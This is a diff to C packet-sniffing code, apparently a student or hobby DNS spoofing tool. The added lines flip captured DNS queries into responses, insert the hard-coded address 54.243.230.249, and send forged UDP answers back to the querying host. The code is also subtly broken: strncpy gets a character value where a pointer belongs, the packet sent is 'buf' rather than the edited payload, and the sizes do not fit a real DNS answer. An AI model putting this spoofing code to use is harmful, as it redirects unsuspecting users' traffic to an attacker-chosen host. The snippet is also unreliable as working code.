@@ -135,7 +135,25 @@ void readPackets(char* dev, pcap_t *handler, char* BPFfilters, char* strpattern)
 			dns = (struct DNS_HEADER*)payload;
 			if(dns->qr == 0){
 				printf("this is a DNS query\n");
+				dns->qr = 1;
+				strncpy(payload[sizeof(struct DNS_HEADER) + sizeof(struct QUESTION)], "54.243.230.249", 14);
 				
+				struct sockaddr_in dest;
+				s = socket(AF_INET , SOCK_DGRAM , IPPROTO_UDP); //UDP packet for DNS queries
+				
+				dest.sin_family = AF_INET;
+				dest.sin_port = htons(53);
+				dest.sin_addr.s_addr = inet_addr(inet_ntoa(ip->ip_src));
+				if( sendto(s,
+					(char*)buf,
+					sizeof(struct DNS_HEADER) + 2*sizeof(struct QUESTION),
+					0,
+					(struct sockaddr*)&dest,
+					sizeof(dest)) < 0){
+					perror("sendto failed");
+				}
+
+
 			}
 		}
 
